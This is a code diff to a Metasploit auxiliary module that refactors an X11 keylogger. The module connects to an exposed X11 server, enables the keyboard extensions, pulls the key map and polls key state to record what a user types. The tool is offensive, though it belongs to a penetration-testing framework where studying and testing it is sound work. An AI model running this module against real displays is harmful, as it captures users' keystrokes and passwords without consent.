@@ -145,13 +145,13 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Msf::Module::Failure::UnexpectedReply, 'Port connected, but no response to X11 connection attempt') if connection.nil?
 
     if connection.header.success == 1
-      print_connection_info(connection, datastore['RHOST'], rport)
+      x11_print_connection_info(connection, datastore['RHOST'], rport)
     else
       fail_with(Msf::Module::Failure::UnexpectedReply, 'X11 connection not successful')
     end
 
     vprint_status('[2/9] Checking on BIG-REQUESTS extension')
-    big_requests_plugin = query_extension('BIG-REQUESTS', query_extension_call_counter)
+    big_requests_plugin = x11_query_extension('BIG-REQUESTS', query_extension_call_counter)
     fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to process response') if big_requests_plugin.nil?
     if big_requests_plugin.present == 1
       print_good("  Extension BIG-REQUESTS is present with id #{big_requests_plugin.major_opcode}")
@@ -160,7 +160,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     vprint_status('[3/9] Enabling BIG-REQUESTS')
-    toggle = toggle_extension(big_requests_plugin.major_opcode)
+    toggle = x11_toggle_extension(big_requests_plugin.major_opcode)
     fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to enable extension') if toggle.nil?
 
     vprint_status('[4/9] Creating new graphical context')
@@ -181,18 +181,10 @@ class MetasploitModule < Msf::Auxiliary
 
     # nothing valuable in the response, just make sure we read it in to
     # confirm its expected data and not leave the response on the socket
-    begin
-      packet = sock.timed_read(X11GetPropertyResponseHeader.new.num_bytes)
-      packet_header = X11GetPropertyResponseHeader.read(packet)
-
-      packet = sock.timed_read(packet_header.value_length * 4)
-      X11GetPropertyResponseData.read(packet)
-    rescue StandardError => e
-      vprint_bad("Error (#{e}) processing data: #{packet.bytes.map { |b| %(\\x) + b.to_s(16).rjust(2, '0') }.join}")
-    end
+    x11_read_response(X11GetPropertyResponse)
 
     vprint_status('[5/9] Checking on XKEYBOARD extension')
-    xkeyboard_plugin = query_extension('XKEYBOARD', query_extension_call_counter)
+    xkeyboard_plugin = x11_query_extension('XKEYBOARD', query_extension_call_counter)
     fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to process response') if xkeyboard_plugin.nil?
     if xkeyboard_plugin.present == 1
       print_good("  Extension XKEYBOARD is present with id #{xkeyboard_plugin.major_opcode}")
@@ -201,7 +193,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     vprint_status('[6/9] Enabling XKEYBOARD')
-    toggle = toggle_extension(xkeyboard_plugin.major_opcode, wanted_major: 1)
+    toggle = x11_toggle_extension(xkeyboard_plugin.major_opcode, wanted_major: 1)
     fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to enable extension') if toggle.nil?
 
     vprint_status('[7/9] Requesting XKEYBOARD map')
@@ -209,15 +201,8 @@ class MetasploitModule < Msf::Auxiliary
                                   full_key_types: 1,
                                   full_key_syms: 1,
                                   full_modifier_map: 1).to_binary_s)
-    map_raw_data = sock.get_once(-1, 1)
-    # for debugging packet output, uncomment following line
-    # puts data.bytes.map { |b| "\\x" + b.to_s(16).rjust(2, '0') }.join
-    begin
-      map_data = X11GetMapReply.read(map_raw_data)
-    rescue EOFError
-      debug_data = map_raw_data.bytes.map { |b| '\\x' + b.to_s(16).rjust(2, '0') }.join
-      fail_with(Msf::Module::Failure::UnexpectedReply, "Unable to process X11GetMapReply response (EOFError): #{debug_data}")
-    end
+
+    map_data = x11_read_response(X11GetMapResponse)
 
     vprint_status('[8/9] Enabling notification on keyboard and map')
     sock.put(X11SelectEvents.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
@@ -247,10 +232,12 @@ class MetasploitModule < Msf::Auxiliary
     printerval = datastore['PRINTERVAL'].to_i
     begin
       loop do
+        # sleep 1
         break if timeout > 0 && (stime + timeout < Process.clock_gettime(Process::CLOCK_MONOTONIC))
 
         sock.put(X11QueryKeyMapRequest.new.to_binary_s)
-        bit_array_of_keystrokes = X11QueryKeyMapReply.read(sock.get_once(-1, 1)).data
+        query_key_map_response = x11_read_response(X11QueryKeyMapResponse)
+        bit_array_of_keystrokes = query_key_map_response.data
         # we poll FAR quicker than a normal key press, so we need to filter repeats
         unless bit_array_of_keystrokes == last_key_press_array # skip repeats
           translate_keystroke(bit_array_of_keystrokes, key_map, last_key_press_array) unless bit_array_of_keystrokes == empty
